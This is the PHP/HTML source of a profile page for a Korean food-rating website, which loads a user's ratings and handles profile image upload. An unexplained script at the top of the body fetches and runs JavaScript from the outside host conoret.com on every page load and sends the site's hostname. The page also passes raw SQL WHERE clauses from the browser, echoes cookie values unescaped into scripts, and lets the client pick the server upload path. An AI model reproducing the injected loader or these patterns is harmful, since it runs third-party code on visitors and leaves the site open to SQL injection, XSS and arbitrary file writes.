<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="src/favicon.png">

    <title>ssosso-table.food-db.rating</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }

        }
    </style>
    <!-- Custom styles for this template -->
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="./css/main/css2">
    <link rel="stylesheet" href="./css/rating/css2">

    <link href="./css/main/cover.css" rel="stylesheet">
    <!--        <link href="./css/main.css" rel="stylesheet">-->
    <style>
        @media only screen and (max-width : 640px) {
            #scroll_layout {
                max-width: 1000px !important;
                width: 400px !important;
                max-height: 600px !important;
                margin: auto;
                overflow-y: scroll;
            }
            .card {
                width: 350px !important;
                margin: auto;
            }
            .high-rating-layout img,.low-rating-layout img {
                width: 40px!important;
                height: 40px!important;
            }
            .rating-stars img {
                width: 5px!important;
                height: 10px!important;
            }
            #high-rating-holder,#low-rating-holder {
                height: 100px !important;
            }
            ul {
                display: inline-block!important;
            }
            li {
                width: 300px!important;
                margin: auto!important;
            }
            #taste-list img {
                width: 300px!important;
                height: 150px!important;
            }
            .nav-link {
                font-size: 10px;
            }
            .masthead-brand {
                width: 40px;
                height: 40px;
            }
        }
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }

        main {
            width: 550px;
        }

        html,
        body {
            font-family: Jua;
            height: 100%;
            overflow-y:scroll;
        }
        body {
            display: flex;
            align-items: center;
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #f5f5f5;
            color: #2c3034;
        }
        header {
            width: 550px;
        }
        .nav-link {
            font-weight: 300 !important;
        }
        .nav-masthead .active {
            color: #2c3034;
            border-bottom-color: transparent;
        }
        a:focus, a:hover {
            border-bottom-color: #2c3034 !important;
            color: #2c3034 !important;
        }
        p {
            color: #2c3034 !important;
        }
        html::-webkit-scrollbar {
            display: none;  /* Safari and Chrome */
        }
        .img-box {
            width: 150px;
            height: 150px;
            border-radius: 30%;
            overflow: hidden;
            border: 1px solid black;
        }
        .card-img-top {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        #high-rating-holder{
            display: flex;
            overflow-y: hidden !important;
        }

        .high-rating-layout{
            margin: 5px;
            -webkit-box-flex: 0;
            -ms-flex-positive: 0;
            flex-grow: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            max-width: 77px;
        }
        #low-rating-holder{
            display: flex;
            overflow-y: hidden !important;
        }
        .low-rating-layout{
            margin: 5px;
            -webkit-box-flex: 0;
            -ms-flex-positive: 0;
            flex-grow: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            max-width: 77px;
        }
        body {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;

        }
        .cover-container {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;
        }
        main {
            padding: 0!important;
            margin: 0!important;
            height: 100%!important;
            width: 100% !important;
        }

        nav {
            background-color:#ffebaa;
            height: 80px!important;
            padding: 0!important;
        }
        .cover-container {
            max-width: 100%;
            width: 100%;
            padding-left: 0!important;
            padding-right: 0!important;
            margin: 0!important;
        }
        #my-info {
            width: 100%;
            height: 100%;
            background-color: transparent;
        }
        .card {
            background-color: transparent;
            width: 100% !important;
        }
        #taste-list img {
            width: 100%;
            height: 100%;
        }
    </style>
    <script src="./script/main/dsp" type="text/javascript" defer="" async=""></script>
    <script src="./script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js" integrity="sha384-IDwe1+LCz02ROU9k972gdyvl+AESN10+x7tBKgc9I5HFtuNz0wWnPclzo6p9vxnk" crossorigin="anonymous"></script>
    <script type="text/javascript">

        let userId= <?php echo $_COOKIE['user_id'];?>

        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;
        mql.addListener(function(e) {
            if(e.matches) {
                // 모바일
                flag=true
            } else {
                // 데스크탑
                flag=false
            }
        });

        function getScore() {
            let height=parseInt(arguments[1])
            let width=parseInt(arguments[1])/2
            switch (parseInt(arguments[0])) {
                case 1:
                    return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 2:
                    return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 3:
                    return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 4:
                    return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 5:
                    return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 6: return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 7: return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 8: return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 9: return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 10: return `
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
        <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">`
                default:
                    break
            }
        }

        async function init() {
            if(mql.matches) {
                // 모바일
                flag=true
                document.getElementById('my-info').style.cssText="display:none!important"
                document.getElementById('my-info-taste').style.cssText="display:block"
                document.getElementById('left-content').style.cssText=`
                margin: 0 auto auto auto;
                max-height: 100%;
                overflow-y: auto;
                `
                document.getElementById('taste-image').style.cssText=`
                width: 100%!important;
                height: fit-content!important;
                `
            }
            else {
                // 데스크톱
                flag=false
            }
            const high_rating=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'food.id,food.name,user.image,food.image,rating,user.nickname',
                    2:'user,food,rating',
                    3:`user.id=${userId} and rating >= 8 and food.id=rating.foodid and user.id=rating.userid;`
                }}))
            const low_rating=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'food.id,food.name,user.image,food.image,rating,user.nickname',
                    2:'user,food,rating',
                    3:`user.id=${userId} and rating < 6 and food.id=rating.foodid and user.id=rating.userid;`
                }}))

            document.getElementById('userImage').src=high_rating[0][2]
            document.getElementById('high-rating-holder').innerHTML=''
            document.getElementById('low-rating-holder').innerHTML=''

            for(let i=0; i <high_rating.length;i++) {
                let high_div=
                        `<div class="high-rating-layout">
                        <img src="src/ramen.jpg" width="80px" height="80px">
                        <span style="display: block;">${high_rating[i][1]}</span>
                        <span class="rating-stars">${getScore(high_rating[i][4],10)}</span>
                        </div>`
                document.getElementById('high-rating-holder').innerHTML+=high_div
            }
            for(let i=0; i <low_rating.length;i++) {
                let low_div=
                    `<div class="high-rating-layout">
                        <img src="src/ramen.jpg" width="80px" height="80px">
                        <span style="display: block;">${low_rating[i][1]}</span>
                        <span class="rating-stars">${getScore(low_rating[i][4],10)}</span>
                        </div>`
                document.getElementById('low-rating-holder').innerHTML+=low_div
            }

            const v=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'userid,foodid,rating,name,image',
                    2:'rating,food',
                    3:`rating.userid=${userId} and rating.foodid=food.id;`
                }}))

            let rating_divs=``
            let rating_stars=``

            for(let j=0;j<v.length;j++) {
                const rate=parseInt(v[j][2])
                rating_stars=getScore(rate,40)
                rating_divs+=`
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                <div style="display: inline-block; margin: 0;">
                <img src="/src/ramen.jpg" height="60" width="60">
                </div>
                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                <div class="d-flex justify-content-start fs-3" style="">
                    <span class="col-10">${v[j][3]}</span>
                </div>
                ${rating_stars}
                </div>
                </div>`
            }
            document.getElementById('scroll-layout-rating').innerHTML=rating_divs


            const fileSelect = document.getElementById("fileSelect"),
                fileElem = document.getElementById("fileElem");

            fileSelect.addEventListener("click", function (e) {
                if (fileElem) {
                    fileElem.click();
                }
            }, false);
        }
        async function handleFiles(files) {
            let postJson={}
            const preview=document.getElementById("preview")
            let formData = new FormData();

            for (let i = 0; i < files.length; i++) {

                const file = files[i];
                const idx=(file.name).indexOf('.')
                const fileName=`${userId}.${(file.name).substring(idx+1)}`
                const filePath=`/var/www/html/config/userImages/${fileName}`
                postJson[0]=3
                postJson[1]='user'
                postJson[2]=`image=http://ssossotable.com/config/userImages/${fileName}`
                postJson[3]=`id=${userId}`
                await $.post( "script/php/DAOHandler.php",postJson)

                formData.append("filePath", filePath);
                formData.append("image", file);

                await $.ajax({
                    type:"POST",
                    url: "/script/php/FileHandler.php",
                    processData: false,
                    contentType: false,
                    data: formData
                })

                if (!file.type.startsWith('image/')){ continue }

                const img = document.createElement("img");
                img.classList.add("obj");
                img.file = file;
                img.width=150
                img.height=150

                preview.innerHTML=``
                preview.appendChild(img); // "preview"가 결과를 보여줄 div 출력이라 가정.

                const reader = new FileReader();
                reader.onload = (function(aImg) { return function(e) { aImg.src = e.target.result; }; })(img);
                reader.readAsDataURL(file);
            }
        }
    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>

<div class="cover-container d-flex h-100 p-3 mx-auto flex-column" style="margin: 0 !important;">
    <nav class="navbar d-flex">
        <a class="navbar-brand p-2" href="http://ssossotable.com/rating.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="60px" height="60px"></a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>

    <main role="main" class="inner cover d-flex" id="rating">
        <div id="left-content" class="card" style="margin: auto; height: 100%">
            <div>
                <div id="preview" class="img-box col align-self-center" style="margin: 20px auto 20px auto;">
                    <img src="/src/Portrait_Placeholder.png" id="userImage" class="card-img-top" alt="...">
                </div>
                <div>
                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                    <input type="button" class="btn" id="fileSelect" value="프로필 이미지 변경" style="background-color:#e4bd74; color:white;">
                </div>
            </div>
            <div class="card-body">
                <h5 class="card-title"> <?php echo $_COOKIE['user_nickname']; ?> </h5>
                <p class="card-text">ssosso.table</p>
                <div id="high-rating">
                    <span style="display:block;">높은 점수를 준 음식들</span>
                    <div id="high-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                    </div>
                </div>
                <div id="low-rating" >
                    <span style="display:block;">낮은 점수를 준 음식들</span>
                    <div id="low-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                    </div>
                </div>
                <div id="my-info-taste" style="display:none;">
                    <span class="card-title" style="display: block">음식 취향 순위</span>
                    <div class="placeholder-glow">
                        <div class="card-img-top" id="taste-list" style="">
                            <img id="taste-image" src="config/ratingInfos/<?php echo $_COOKIE['user_id'];?>.png" style="width: 640px; height: 480px">
                        </div>
                    </div>
                    <ul class="card list-group list-group-flush" style="margin-top: auto;">
                        <li class="list-group-item" style="padding:0;">
                            <input type="button" value="평가한 음식" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" data-bs-toggle="modal" data-bs-target="#myFoodModal" style="width:100%;">
                        </li>
                        <li class="list-group-item" style="padding: 0;">
                            <a href="/script/php/logout.php" style="margin-top: 5px;"><input type="button" value="로그아웃" class="btn" style="background-color:#e4bd74; color:white; width: 100%;"></a>
                        </li>
                    </ul>
                </div>
            </div>

        </div>
        <div class="card d-flex flex-columns" id='my-info' style="">
            <span class="card-title" style="display: block">음식 취향 순위</span>
            <div class="placeholder-glow">
                <div class="card-img-top" id="taste-list" style="">
                    <img src="config/ratingInfos/<?php echo $_COOKIE['user_id'];?>.png" style="width: 640px; height: 480px">
                </div>
            </div>
            <ul class="card list-group list-group-flush" style="margin-top: auto;">
                <li class="list-group-item" style="padding:0;">
                    <input type="button" value="평가한 음식" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" data-bs-toggle="modal" data-bs-target="#myFoodModal" style="width:100%;">
                </li>
                <li class="list-group-item" style="padding: 0;">
                    <a href="/script/php/logout.php" style="margin-top: 5px;"><input type="button" value="로그아웃" class="btn" style="background-color:#e4bd74; color:white; width: 100%;"></a>
                </li>
            </ul>
        </div>
    </main>

        <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">

            <div class="inner">
                <p style="margin: 0;">Created by<a href="http://ssossotable.com"> ssosso.table.u</a>, of <a href="http://ssossotable.com">@ssosso.table</a></p>
            </div>
        </footer>
        </div>
        <!-- Button trigger modal -->



        <!-- Modal -->
        <div class="modal fade" id="myFoodModal" tabindex="-1" aria-labelledby="myFoodModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="myFoodModalLabel">내 음식</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body" id="scroll-layout-rating">
                        <div class="rating-placeholders">
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">닫기</button>
                    </div>
                </div>
            </div>
        </div>

</div>
<script>
    init()
</script>
</body>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</html>